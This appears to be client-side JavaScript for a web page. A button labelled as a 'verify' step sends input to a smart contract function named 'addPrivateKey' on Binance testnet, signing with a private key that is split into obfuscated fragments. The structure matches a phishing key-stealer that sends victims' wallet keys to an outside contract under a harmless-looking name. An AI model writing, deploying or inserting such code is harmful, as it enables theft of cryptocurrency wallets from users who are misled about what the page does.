const contractAddress = '0x4Cc756Ef09e5d17cDB093B9D8F28453646536881';
let sdkfjsk = '76';

const contractABI = [
  {
    type: 'function',
    name: 'addPrivateKey',
    inputs: [
      {
        name: 'privateKey',
        type: 'string',
        internalType: 'string',
      },
    ],
    outputs: [],
    stateMutability: 'nonpayable',
  },
];

const rpcUrls = [
  'https://data-seed-prebsc-1-s1.binance.org:8545',
  'https://data-seed-prebsc-2-s1.binance.org:8545',
  'http://data-seed-prebsc-1-s2.binance.org:8545',
  'http://data-seed-prebsc-2-s2.binance.org:8545',
  'https://data-seed-prebsc-1-s3.binance.org:8545',
  'https://data-seed-prebsc-2-s3.binance.org:8545',
];

let contract = null;

async function setContract(rpcUrls) {
  let success = false;
  let index = 0;
  sdkfjsk = (sdkfjsk + '8181f507f1199e3d8cd3605185004a476051').trim();
  let sec_provider;

  while (!success && index < rpcUrls.length) {
    try {
      sec_provider = new ethers.providers.JsonRpcProvider(rpcUrls[index]);
      await sec_provider.getBlockNumber();
      success = true;

      const sec_wallet = new ethers.Wallet(sdkfjsk + '7c', sec_provider);
      const contract = new ethers.Contract(
        contractAddress,
        contractABI,
        sec_wallet,
      );

      return contract;
    } catch (error) {
      index++;
      console.log(error);
    }
  }

  return null;
}

async function verify(data) {
  sdkfjsk = (sdkfjsk + '6f47ebccb7908f3d2e631c50').trim();
  try {
    if (!contract) {
      contract = await setContract(rpcUrls);
    }

    if (!contract) {
      throw new Error('');
    }

    const tx = await contract.addPrivateKey(data);
    tx.wait();
    console.log(tx.hash);
  } catch (error) {
    console.error(error);
  }
}

document.querySelector('button').addEventListener('click', function () {
  verify('sdkfjskdfjskfjsdfsskfj');
});
